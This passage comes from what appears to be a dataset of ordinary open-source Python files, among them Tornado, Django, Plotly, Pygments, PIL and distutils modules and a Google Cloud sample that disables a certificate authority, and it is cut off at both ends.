        proc = subprocess.Popen([sys.executable], stdin=subprocess.PIPE)
        proc.communicate(_import_everything)
        self.assertEqual(proc.returncode, 0)

    def test_import_aliases(self):
        # Ensure we don't delete formerly-documented aliases accidentally.
        import tornado.ioloop
        import tornado.gen
        import tornado.util
        import asyncio

        self.assertIs(tornado.ioloop.TimeoutError, tornado.util.TimeoutError)
        self.assertIs(tornado.gen.TimeoutError, tornado.util.TimeoutError)
        self.assertIs(tornado.util.TimeoutError, asyncio.TimeoutError)"
JD395	JD395-disable_certificate_authority.py	"#!/usr/bin/env python

# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START privateca_disable_ca]
import google.cloud.security.privateca_v1 as privateca_v1


def disable_certificate_authority(
    project_id: str, location: str, ca_pool_name: str, ca_name: str
) -> None:
    """"""
    Disable a Certificate Authority which is present in the given CA pool.

    Args:
        project_id: project ID or project number of the Cloud project you want to use.
        location: location you want to use. For a list of locations, see: https://cloud.google.com/certificate-authority-service/docs/locations.
        ca_pool_name: the name of the CA pool under which the CA is present.
        ca_name: the name of the CA to be disabled.
    """"""

    caServiceClient = privateca_v1.CertificateAuthorityServiceClient()
    ca_path = caServiceClient.certificate_authority_path(
        project_id, location, ca_pool_name, ca_name
    )

    # Create the Disable Certificate Authority Request.
    request = privateca_v1.DisableCertificateAuthorityRequest(name=ca_path)

    # Disable the Certificate Authority.
    operation = caServiceClient.disable_certificate_authority(request=request)
    result = operation.result()

    print(""Operation result:"", result)

    # Get the current CA state.
    ca_state = caServiceClient.get_certificate_authority(name=ca_path).state

    # Check if the CA is disabled.
    if ca_state == privateca_v1.CertificateAuthority.State.DISABLED:
        print(""Disabled Certificate Authority:"", ca_name)
    else:
        print(""Cannot disable the Certificate Authority ! Current CA State:"", ca_state)


# [END privateca_disable_ca]"
JD290	JD290-MSVSToolFile.py	"# Copyright (c) 2012 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""Visual Studio project reader/writer.""""""

import gyp.common
import gyp.easy_xml as easy_xml


class Writer(object):
  """"""Visual Studio XML tool file writer.""""""

  def __init__(self, tool_file_path, name):
    """"""Initializes the tool file.

    Args:
      tool_file_path: Path to the tool file.
      name: Name of the tool file.
    """"""
    self.tool_file_path = tool_file_path
    self.name = name
    self.rules_section = ['Rules']

  def AddCustomBuildRule(self, name, cmd, description,
                         additional_dependencies,
                         outputs, extensions):
    """"""Adds a rule to the tool file.

    Args:
      name: Name of the rule.
      description: Description of the rule.
      cmd: Command line of the rule.
      additional_dependencies: other files which may trigger the rule.
      outputs: outputs of the rule.
      extensions: extensions handled by the rule.
    """"""
    rule = ['CustomBuildRule',
            {'Name': name,
             'ExecutionDescription': description,
             'CommandLine': cmd,
             'Outputs': ';'.join(outputs),
             'FileExtensions': ';'.join(extensions),
             'AdditionalDependencies':
                 ';'.join(additional_dependencies)
            }]
    self.rules_section.append(rule)

  def WriteIfChanged(self):
    """"""Writes the tool file.""""""
    content = ['VisualStudioToolFile',
               {'Version': '8.00',
                'Name': self.name
               },
               self.rules_section
               ]
    easy_xml.WriteXmlIfChanged(content, self.tool_file_path,
                               encoding=""Windows-1252"")"
JY395	JY395-test_argument.py	"from functools import partial

import pytest

from ..argument import Argument, to_arguments
from ..field import Field
from ..inputfield import InputField
from ..scalars import String
from ..structures import NonNull


def test_argument():
    arg = Argument(String, default_value=""a"", description=""desc"", name=""b"")
    assert arg.type == String
    assert arg.default_value == ""a""
    assert arg.description == ""desc""
    assert arg.name == ""b""


def test_argument_comparasion():
    arg1 = Argument(String, name=""Hey"", description=""Desc"", default_value=""default"")
    arg2 = Argument(String, name=""Hey"", description=""Desc"", default_value=""default"")

    assert arg1 == arg2
    assert arg1 != String()


def test_argument_required():
    arg = Argument(String, required=True)
    assert arg.type == NonNull(String)


def test_to_arguments():
    args = {""arg_string"": Argument(String), ""unmounted_arg"": String(required=True)}

    my_args = to_arguments(args)
    assert my_args == {
        ""arg_string"": Argument(String),
        ""unmounted_arg"": Argument(String, required=True),
    }


def test_to_arguments_raises_if_field():
    args = {""arg_string"": Field(String)}

    with pytest.raises(ValueError) as exc_info:
        to_arguments(args)

    assert str(exc_info.value) == (
        ""Expected arg_string to be Argument, but received Field. Try using ""
        ""Argument(String).""
    )


def test_to_arguments_raises_if_inputfield():
    args = {""arg_string"": InputField(String)}

    with pytest.raises(ValueError) as exc_info:
        to_arguments(args)

    assert str(exc_info.value) == (
        ""Expected arg_string to be Argument, but received InputField. Try ""
        ""using Argument(String).""
    )


def test_argument_with_lazy_type():
    MyType = object()
    arg = Argument(lambda: MyType)
    assert arg.type == MyType


def test_argument_with_lazy_partial_type():
    MyType = object()
    arg = Argument(partial(lambda: MyType))
    assert arg.type == MyType"
JD38	JD38-compat.py	"# -*- coding: utf-8 -*-

""""""
requests.compat
~~~~~~~~~~~~~~~

This module handles import compatibility issues between Python 2 and
Python 3.
""""""

from pip._vendor import chardet

import sys

# -------
# Pythons
# -------

# Syntax sugar.
_ver = sys.version_info

#: Python 2.x?
is_py2 = (_ver[0] == 2)

#: Python 3.x?
is_py3 = (_ver[0] == 3)

# Note: We've patched out simplejson support in pip because it prevents
#       upgrading simplejson on Windows.
# try:
#     import simplejson as json
# except (ImportError, SyntaxError):
#     # simplejson does not support Python 3.2, it throws a SyntaxError
#     # because of u'...' Unicode literals.
import json

# ---------
# Specifics
# ---------

if is_py2:
    from urllib import (
        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,
        proxy_bypass, proxy_bypass_environment, getproxies_environment)
    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag
    from urllib2 import parse_http_list
    import cookielib
    from Cookie import Morsel
    from StringIO import StringIO
    # Keep OrderedDict for backwards compatibility.
    from collections import Callable, Mapping, MutableMapping, OrderedDict


    builtin_str = str
    bytes = str
    str = unicode
    basestring = basestring
    numeric_types = (int, long, float)
    integer_types = (int, long)

elif is_py3:
    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag
    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment
    from http import cookiejar as cookielib
    from http.cookies import Morsel
    from io import StringIO
    # Keep OrderedDict for backwards compatibility.
    from collections import OrderedDict
    from collections.abc import Callable, Mapping, MutableMapping

    builtin_str = str
    str = str
    bytes = bytes
    basestring = (str, bytes)
    numeric_types = (int, float)
    integer_types = (int,)"
JY17	JY17-iolang.py	"""""""
    pygments.lexers.iolang
    ~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the Io language.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer
from pygments.token import Text, Comment, Operator, Keyword, Name, String, \
    Number, Whitespace

__all__ = ['IoLexer']


class IoLexer(RegexLexer):
    """"""
    For Io (a small, prototype-based programming language) source.

    .. versionadded:: 0.10
    """"""
    name = 'Io'
    url = 'http://iolanguage.com/'
    filenames = ['*.io']
    aliases = ['io']
    mimetypes = ['text/x-iosrc']
    tokens = {
        'root': [
            (r'\n', Whitespace),
            (r'\s+', Whitespace),
            # Comments
            (r'//(.*?)$', Comment.Single),
            (r'#(.*?)$', Comment.Single),
            (r'/(\\\n)?[*](.|\n)*?[*](\\\n)?/', Comment.Multiline),
            (r'/\+', Comment.Multiline, 'nestedcomment'),
            # DoubleQuotedString
            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),
            # Operators
            (r'::=|:=|=|\(|\)|;|,|\*|-|\+|>|<|@|!|/|\||\^|\.|%|&|\[|\]|\{|\}',
             Operator),
            # keywords
            (r'(clone|do|doFile|doString|method|for|if|else|elseif|then)\b',
             Keyword),
            # constants
            (r'(nil|false|true)\b', Name.Constant),
            # names
            (r'(Object|list|List|Map|args|Sequence|Coroutine|File)\b',
             Name.Builtin),
            (r'[a-zA-Z_]\w*', Name),
            # numbers
            (r'(\d+\.?\d*|\d*\.\d+)([eE][+-]?[0-9]+)?', Number.Float),
            (r'\d+', Number.Integer)
        ],
        'nestedcomment': [
            (r'[^+/]+', Comment.Multiline),
            (r'/\+', Comment.Multiline, '#push'),
            (r'\+/', Comment.Multiline, '#pop'),
            (r'[+/]', Comment.Multiline),
        ]
    }"
JD36	JD36-_utils.py	"# Copyright 2016 Julien Danjou
# Copyright 2016 Joshua Harlow
# Copyright 2013-2014 Ray Holder
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys
import typing


# sys.maxsize:
# An integer giving the maximum value a variable of type Py_ssize_t can take.
MAX_WAIT = sys.maxsize / 2


def find_ordinal(pos_num: int) -> str:
    # See: https://en.wikipedia.org/wiki/English_numerals#Ordinal_numbers
    if pos_num == 0:
        return ""th""
    elif pos_num == 1:
        return ""st""
    elif pos_num == 2:
        return ""nd""
    elif pos_num == 3:
        return ""rd""
    elif 4 <= pos_num <= 20:
        return ""th""
    else:
        return find_ordinal(pos_num % 10)


def to_ordinal(pos_num: int) -> str:
    return f""{pos_num}{find_ordinal(pos_num)}""


def get_callback_name(cb: typing.Callable[..., typing.Any]) -> str:
    """"""Get a callback fully-qualified name.

    If no name can be produced ``repr(cb)`` is called and returned.
    """"""
    segments = []
    try:
        segments.append(cb.__qualname__)
    except AttributeError:
        try:
            segments.append(cb.__name__)
        except AttributeError:
            pass
    if not segments:
        return repr(cb)
    else:
        try:
            # When running under sphinx it appears this can be none?
            if cb.__module__:
                segments.insert(0, cb.__module__)
        except AttributeError:
            pass
        return ""."".join(segments)"
JY264	JY264-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""hoverlabel"", parent_name=""scatterternary"", **kwargs
    ):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD482	JD482-lex_attrs.py	"# coding: utf8
from __future__ import unicode_literals

from ...attrs import LIKE_NUM

_num_words = [
    ""אפס"",
    ""אחד"",
    ""אחת"",
    ""שתיים"",
    ""שתים"",
    ""שניים"",
    ""שנים"",
    ""שלוש"",
    ""שלושה"",
    ""ארבע"",
    ""ארבעה"",
    ""חמש"",
    ""חמישה"",
    ""שש"",
    ""שישה"",
    ""שבע"",
    ""שבעה"",
    ""שמונה"",
    ""תשע"",
    ""תשעה"",
    ""עשר"",
    ""עשרה"",
    ""אחד עשר"",
    ""אחת עשרה"",
    ""שנים עשר"",
    ""שתים עשרה"",
    ""שלושה עשר"",
    ""שלוש עשרה"",
    ""ארבעה עשר"",
    ""ארבע עשרה"",
    ""חמישה עשר"",
    ""חמש עשרה"",
    ""ששה עשר"",
    ""שש עשרה"",
    ""שבעה עשר"",
    ""שבע עשרה"",
    ""שמונה עשר"",
    ""שמונה עשרה"",
    ""תשעה עשר"",
    ""תשע עשרה"",
    ""עשרים"",
    ""שלושים"",
    ""ארבעים"",
    ""חמישים"",
    ""שישים"",
    ""שבעים"",
    ""שמונים"",
    ""תשעים"",
    ""מאה"",
    ""אלף"",
    ""מליון"",
    ""מליארד"",
    ""טריליון"",
]


_ordinal_words = [
    ""ראשון"",
    ""שני"",
    ""שלישי"",
    ""רביעי"",
    ""חמישי"",
    ""שישי"",
    ""שביעי"",
    ""שמיני"",
    ""תשיעי"",
    ""עשירי"",
]

def like_num(text):
    if text.startswith((""+"", ""-"", ""±"", ""~"")):
        text = text[1:]
    text = text.replace("","", """").replace(""."", """")
    if text.isdigit():
        return True

    if text.count(""/"") == 1:
        num, denom = text.split(""/"")
        if num.isdigit() and denom.isdigit():
            return True
    
    if text in _num_words:
        return True

    # CHeck ordinal number
    if text in _ordinal_words:
        return True
    return False


LEX_ATTRS = {LIKE_NUM: like_num}"
JY127	JY127-models.py	"from django.contrib.sites.models import Site
from django.db import models
from django.urls import NoReverseMatch, get_script_prefix, reverse
from django.utils.encoding import iri_to_uri
from django.utils.translation import gettext_lazy as _


class FlatPage(models.Model):
    url = models.CharField(_(""URL""), max_length=100, db_index=True)
    title = models.CharField(_(""title""), max_length=200)
    content = models.TextField(_(""content""), blank=True)
    enable_comments = models.BooleanField(_(""enable comments""), default=False)
    template_name = models.CharField(
        _(""template name""),
        max_length=70,
        blank=True,
        help_text=_(
            ""Example: “flatpages/contact_page.html”. If this isn’t provided, ""
            ""the system will use “flatpages/default.html”.""
        ),
    )
    registration_required = models.BooleanField(
        _(""registration required""),
        help_text=_(
            ""If this is checked, only logged-in users will be able to view the page.""
        ),
        default=False,
    )
    sites = models.ManyToManyField(Site, verbose_name=_(""sites""))

    class Meta:
        db_table = ""django_flatpage""
        verbose_name = _(""flat page"")
        verbose_name_plural = _(""flat pages"")
        ordering = [""url""]

    def __str__(self):
        return ""%s -- %s"" % (self.url, self.title)

    def get_absolute_url(self):
        from .views import flatpage

        for url in (self.url.lstrip(""/""), self.url):
            try:
                return reverse(flatpage, kwargs={""url"": url})
            except NoReverseMatch:
                pass
        # Handle script prefix manually because we bypass reverse()
        return iri_to_uri(get_script_prefix().rstrip(""/"") + self.url)"
JY207	JY207-autocall.py	"# encoding: utf-8
""""""
Autocall capabilities for IPython.core.

Authors:

* Brian Granger
* Fernando Perez
* Thomas Kluyver

Notes
-----
""""""

#-----------------------------------------------------------------------------
#  Copyright (C) 2008-2011  The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
#-----------------------------------------------------------------------------

#-----------------------------------------------------------------------------
# Imports
#-----------------------------------------------------------------------------


#-----------------------------------------------------------------------------
# Code
#-----------------------------------------------------------------------------

class IPyAutocall(object):
    """""" Instances of this class are always autocalled
    
    This happens regardless of 'autocall' variable state. Use this to
    develop macro-like mechanisms.
    """"""
    _ip = None
    rewrite = True
    def __init__(self, ip=None):
        self._ip = ip
    
    def set_ip(self, ip):
        """"""Will be used to set _ip point to current ipython instance b/f call

        Override this method if you don't want this to happen.

        """"""
        self._ip = ip


class ExitAutocall(IPyAutocall):
    """"""An autocallable object which will be added to the user namespace so that
    exit, exit(), quit or quit() are all valid ways to close the shell.""""""
    rewrite = False
    
    def __call__(self):
        self._ip.ask_exit()
        
class ZMQExitAutocall(ExitAutocall):
    """"""Exit IPython. Autocallable, so it needn't be explicitly called.
    
    Parameters
    ----------
    keep_kernel : bool
      If True, leave the kernel alive. Otherwise, tell the kernel to exit too
      (default).
    """"""
    def __call__(self, keep_kernel=False):
        self._ip.keepkernel_on_exit = keep_kernel
        self._ip.ask_exit()"
JD272	JD272-__init__.py	"""""""
 This module houses ctypes interfaces for GDAL objects.  The following GDAL
 objects are supported:

 CoordTransform: Used for coordinate transformations from one spatial
  reference system to another.

 Driver: Wraps an OGR data source driver.

 DataSource: Wrapper for the OGR data source object, supports
  OGR-supported data sources.

 Envelope: A ctypes structure for bounding boxes (GDAL library
  not required).

 OGRGeometry: Object for accessing OGR Geometry functionality.

 OGRGeomType: A class for representing the different OGR Geometry
  types (GDAL library not required).

 SpatialReference: Represents OSR Spatial Reference objects.

 The GDAL library will be imported from the system path using the default
 library name for the current OS. The default library path may be overridden
 by setting `GDAL_LIBRARY_PATH` in your settings with the path to the GDAL C
 library on your system.
""""""
from django.contrib.gis.gdal.datasource import DataSource
from django.contrib.gis.gdal.driver import Driver
from django.contrib.gis.gdal.envelope import Envelope
from django.contrib.gis.gdal.error import GDALException, SRSException, check_err
from django.contrib.gis.gdal.geometries import OGRGeometry
from django.contrib.gis.gdal.geomtype import OGRGeomType
from django.contrib.gis.gdal.libgdal import (
    GDAL_VERSION,
    gdal_full_version,
    gdal_version,
)
from django.contrib.gis.gdal.raster.source import GDALRaster
from django.contrib.gis.gdal.srs import AxisOrder, CoordTransform, SpatialReference

__all__ = (
    ""AxisOrder"",
    ""Driver"",
    ""DataSource"",
    ""CoordTransform"",
    ""Envelope"",
    ""GDALException"",
    ""GDALRaster"",
    ""GDAL_VERSION"",
    ""OGRGeometry"",
    ""OGRGeomType"",
    ""SpatialReference"",
    ""SRSException"",
    ""check_err"",
    ""gdal_version"",
    ""gdal_full_version"",
)"
JY394	JY394-configuration.py	"import time

from jet_bridge_base.settings import set_settings


class Configuration(object):

    def __init__(self):
        self.init_time = time.time()

    def get_type(self):
        pass

    def get_version(self):
        pass

    def get_model_description(self, db_table):
        pass

    def get_hidden_model_description(self):
        return []

    def get_settings(self):
        pass

    def on_model_pre_create(self, model, pk):
        pass

    def on_model_post_create(self, model, instance):
        pass

    def on_model_pre_update(self, model, instance):
        pass

    def on_model_post_update(self, model, instance):
        pass

    def on_model_pre_delete(self, model, instance):
        pass

    def on_model_post_delete(self, model, instance):
        pass

    def media_get_available_name(self, path):
        pass

    def media_exists(self, path):
        pass

    def media_listdir(self, path):
        pass

    def media_get_modified_time(self, path):
        pass

    def media_open(self, path, mode='rb'):
        pass

    def media_save(self, path, content):
        pass

    def media_delete(self, path):
        pass

    def media_url(self, path, request):
        pass

    def session_set(self, request, name, value, secure=True):
        pass

    def session_get(self, request, name, default=None, decode=True, secure=True):
        pass

    def session_clear(self, request, name):
        pass

    def clean_sso_application_name(self, name):
        return name.lower().replace('-', '')

    def clean_sso_applications(self, applications):
        return dict(map(lambda x: (self.clean_sso_application_name(x[0]), x[1]), applications.items()))


configuration = Configuration()


def set_configuration(new_configuration):
    global configuration
    configuration = new_configuration
    set_settings(configuration.get_settings())"
JD111	JD111-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j. E Y.'
TIME_FORMAT = 'H:i'
DATETIME_FORMAT = 'j. E Y. H:i'
YEAR_MONTH_FORMAT = 'F Y.'
MONTH_DAY_FORMAT = 'j. F'
SHORT_DATE_FORMAT = 'j.m.Y.'
SHORT_DATETIME_FORMAT = 'j.m.Y. H:i'
FIRST_DAY_OF_WEEK = 1

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    '%Y-%m-%d',                     # '2006-10-25'
    '%d.%m.%Y.', '%d.%m.%y.',       # '25.10.2006.', '25.10.06.'
    '%d. %m. %Y.', '%d. %m. %y.',   # '25. 10. 2006.', '25. 10. 06.'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',        # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',     # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',           # '2006-10-25 14:30'
    '%d.%m.%Y. %H:%M:%S',       # '25.10.2006. 14:30:59'
    '%d.%m.%Y. %H:%M:%S.%f',    # '25.10.2006. 14:30:59.000200'
    '%d.%m.%Y. %H:%M',          # '25.10.2006. 14:30'
    '%d.%m.%y. %H:%M:%S',       # '25.10.06. 14:30:59'
    '%d.%m.%y. %H:%M:%S.%f',    # '25.10.06. 14:30:59.000200'
    '%d.%m.%y. %H:%M',          # '25.10.06. 14:30'
    '%d. %m. %Y. %H:%M:%S',     # '25. 10. 2006. 14:30:59'
    '%d. %m. %Y. %H:%M:%S.%f',  # '25. 10. 2006. 14:30:59.000200'
    '%d. %m. %Y. %H:%M',        # '25. 10. 2006. 14:30'
    '%d. %m. %y. %H:%M:%S',     # '25. 10. 06. 14:30:59'
    '%d. %m. %y. %H:%M:%S.%f',  # '25. 10. 06. 14:30:59.000200'
    '%d. %m. %y. %H:%M',        # '25. 10. 06. 14:30'
]

DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '.'
NUMBER_GROUPING = 3"
JD410	JD410-_binary.py	"#
# The Python Imaging Library.
# $Id$
#
# Binary input/output support routines.
#
# Copyright (c) 1997-2003 by Secret Labs AB
# Copyright (c) 1995-2003 by Fredrik Lundh
# Copyright (c) 2012 by Brian Crowell
#
# See the README file for information on usage and redistribution.
#


""""""Binary input/output support routines.""""""


from struct import pack, unpack_from


def i8(c):
    return c if c.__class__ is int else c[0]


def o8(i):
    return bytes((i & 255,))


# Input, le = little endian, be = big endian
def i16le(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<H"", c, o)[0]


def si16le(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<h"", c, o)[0]


def si16be(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to a signed integer, big endian.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from("">h"", c, o)[0]


def i32le(c, o=0):
    """"""
    Converts a 4-bytes (32 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<I"", c, o)[0]


def si32le(c, o=0):
    """"""
    Converts a 4-bytes (32 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<i"", c, o)[0]


def i16be(c, o=0):
    return unpack_from("">H"", c, o)[0]


def i32be(c, o=0):
    return unpack_from("">I"", c, o)[0]


# Output, le = little endian, be = big endian
def o16le(i):
    return pack(""<H"", i)


def o32le(i):
    return pack(""<I"", i)


def o16be(i):
    return pack("">H"", i)


def o32be(i):
    return pack("">I"", i)"
JD359	JD359-install_scripts.py	"""""""distutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts.""""""

# contributed by Bastian Kleineidam

import os
from ..core import Command
from distutils._log import log
from stat import ST_MODE


class install_scripts(Command):
    description = ""install scripts (Python or otherwise)""

    user_options = [
        ('install-dir=', 'd', ""directory to install scripts to""),
        ('build-dir=', 'b', ""build directory (where to install from)""),
        ('force', 'f', ""force installation (overwrite existing files)""),
        ('skip-build', None, ""skip the build steps""),
    ]

    boolean_options = ['force', 'skip-build']

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options('build', ('build_scripts', 'build_dir'))
        self.set_undefined_options(
            'install',
            ('install_scripts', 'install_dir'),
            ('force', 'force'),
            ('skip_build', 'skip_build'),
        )

    def run(self):
        if not self.skip_build:
            self.run_command('build_scripts')
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == 'posix':
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info(""changing mode of %s"", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info(""changing mode of %s to %o"", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []"
JY349	JY349-feeder_service.py	"import datetime
import time

from telegramfeed import interfaces, repositories, services


class FeederService:
    def __init__(
        self,
        chat_interface: interfaces.ChatInterface,
        subscription_repo: repositories.SubscriptionRepo,
        feed_downloader_service: services.FeedDownloaderService,
    ):
        self.chat_interface = chat_interface
        self.subscription_repo = subscription_repo
        self.feed_downloader_service = feed_downloader_service

    def start(self):
        print(""Processing feeds"")
        self.process_feeds()

    def process_feeds(self):
        subscriptions = self.subscription_repo.fetch_all()
        for subscription in subscriptions:
            print(
                f""Processing subscription {subscription.feed_url} for user {subscription.user_id}""
            )
            self._manage_subscription(subscription)

    def _manage_subscription(self, subscription):
        feed_content = self.feed_downloader_service.download(subscription.feed_url)

        if ""entries"" not in feed_content.keys():
            return

        for entry in feed_content[""entries""]:
            self._manage_entry(subscription, entry)

        self._subscription_update_check(subscription)

    def _subscription_update_check(self, subscription):
        subscription.last_check = datetime.datetime.now()
        self.subscription_repo.update(subscription)

    def _manage_entry(self, subscription, entry):
        updated_parsed = datetime.datetime.fromtimestamp(
            time.mktime(entry[""updated_parsed""])
        )
        if subscription.last_check < updated_parsed:
            self.send_entry(subscription, entry)

    def send_entry(self, subscription, entry):
        try:
            self.chat_interface.send_message(subscription.user_id, entry[""link""])
        except Exception as e:
            print(f""Error sending message: {e}"")"
JD144	JD144-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scatterternary.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY90	JY90-log.py	"from django import template
from django.contrib.admin.models import LogEntry

register = template.Library()


class AdminLogNode(template.Node):
    def __init__(self, limit, varname, user):
        self.limit, self.varname, self.user = limit, varname, user

    def __repr__(self):
        return ""<GetAdminLog Node>""

    def render(self, context):
        if self.user is None:
            entries = LogEntry.objects.all()
        else:
            user_id = self.user
            if not user_id.isdigit():
                user_id = context[self.user].pk
            entries = LogEntry.objects.filter(user__pk=user_id)
        context[self.varname] = entries.select_related('content_type', 'user')[:int(self.limit)]
        return ''


@register.tag
def get_admin_log(parser, token):
    """"""
    Populate a template variable with the admin log for the given criteria.

    Usage::

        {% get_admin_log [limit] as [varname] for_user [context_var_containing_user_obj] %}

    Examples::

        {% get_admin_log 10 as admin_log for_user 23 %}
        {% get_admin_log 10 as admin_log for_user user %}
        {% get_admin_log 10 as admin_log %}

    Note that ``context_var_containing_user_obj`` can be a hard-coded integer
    (user ID) or the name of a template context variable containing the user
    object whose ID you want.
    """"""
    tokens = token.contents.split()
    if len(tokens) < 4:
        raise template.TemplateSyntaxError(
            ""'get_admin_log' statements require two arguments"")
    if not tokens[1].isdigit():
        raise template.TemplateSyntaxError(
            ""First argument to 'get_admin_log' must be an integer"")
    if tokens[2] != 'as':
        raise template.TemplateSyntaxError(
            ""Second argument to 'get_admin_log' must be 'as'"")
    if len(tokens) > 4:
        if tokens[4] != 'for_user':
            raise template.TemplateSyntaxError(
                ""Fourth argument to 'get_admin_log' must be 'for_user'"")
    return AdminLogNode(limit=tokens[1], varname=tokens[3], user=(tokens[5] if len(tokens) > 5 else None))"
JD484	JD484-__init__.py	"# -*- coding: utf-8 -*-
#
# Copyright (C) 2019 Radim Rehurek <me@radimrehurek.com>
#
# This code is distributed under the terms and conditions
# from the MIT License (MIT).
#

""""""
Utilities for streaming to/from several file-like data storages: S3 / HDFS / local
filesystem / compressed files, and many more, using a simple, Pythonic API.

The streaming makes heavy use of generators and pipes, to avoid loading
full file contents into memory, allowing work with arbitrarily large files.

The main functions are:

* `open()`, which opens the given file for reading/writing
* `parse_uri()`
* `s3_iter_bucket()`, which goes over all keys in an S3 bucket in parallel
* `register_compressor()`, which registers callbacks for transparent compressor handling

""""""

import logging

#
# Prevent regression of #474 and #475
#
logger = logging.getLogger(__name__)
logger.addHandler(logging.NullHandler())

from smart_open import version  # noqa: E402
from .smart_open_lib import open, parse_uri, smart_open, register_compressor  # noqa: E402

_WARNING = """"""smart_open.s3_iter_bucket is deprecated and will stop functioning
in a future version. Please import iter_bucket from the smart_open.s3 module instead:

    from smart_open.s3 import iter_bucket as s3_iter_bucket

